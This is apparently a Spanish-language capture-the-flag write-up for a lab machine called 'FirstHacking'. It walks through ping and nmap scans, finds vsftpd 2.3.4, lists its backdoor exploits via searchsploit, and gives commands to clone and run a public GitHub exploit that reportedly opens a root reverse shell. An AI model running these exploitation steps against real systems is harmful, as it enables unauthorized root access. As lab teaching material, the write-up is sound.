# FirstHacking

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Como tenemos abierto el puerto 21, vamos a comprobar las versiones y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p21 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p21`: Escaneo de los puertos 21 (FTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.

```bash
  PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix
```
Vemos que la versión de ftp es vsftpd 2.3.4, comprobamos en searchsploit si es vulnerable y vemos que si hay exploits que podríamos utilizar.
```bash
❯ searchsploit vsftpd 2.3.4
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                    | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                       | unix/remote/17491.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
En este caso yo voy a utilizar un exploit que encontramos en [GITHUB](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit). Seguimos las instrucción que nos indican en la página y nos crea un reverse shell como usuario root de la máquina.
´´´bash
sudo python3 -m pip install pwntools
git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
cd vsftpd_2.3.4_Exploit/
chmod +x exploit.py
´´´
´´´bash
python3 exploit.py 172.17.0.2
´´´



